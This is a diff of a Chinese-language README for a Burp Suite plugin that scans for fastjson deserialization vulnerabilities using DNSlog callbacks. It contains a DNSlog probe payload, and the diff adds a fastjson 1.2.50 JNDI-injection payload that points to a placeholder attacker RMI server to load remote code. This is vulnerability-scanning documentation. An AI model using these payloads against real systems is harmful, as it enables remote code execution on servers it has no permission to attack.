@@ -1,4 +1,4 @@
-# fastjsondnslog
+# fastjsondnslog_use
 #### Burp 插件 探测fastjson
 
 用dnslog来进行探测，使用到的payload为：{"@type":"java.net.Inet4Address","val":"x.dnslog.cn"}   (全版本支持 fastjson <= 1.2.72)
@@ -10,7 +10,7 @@
 ### 2.可以看到请求的方法、路径
 ### 3.识别Content-Type类型为json才会发送请求，并不是所有请求都会发送该请求，且做到了三个请求探测
 
-# fastjsondnslog
+# fastjsondnslogvul1.0
 #### Burp 插件 探测fastjson反序列化漏洞
 
 用dnslog来进行探测是否有fastjson反序列化漏洞，所以需要和dnslog相通
@@ -21,4 +21,6 @@
 ### 4.不会冗余，做到请求去重，单个请求只会探测一次，其他burp的fastjson工具可能看到请求都会去探测
 
 # todo
-高版本的payload没有加进来
+高版本的payload没有加进来，只针对于1.2.24和1.2.47两个payload
+## 1.2.50 payload
+{"@type":"java.lang.AutoCloseable","@type":"oracle.jdbc.rowset.OracleJDBCRowSet","dataSourceName":"rmi://x.x.x.x:4444/Exploit","command":"a"}
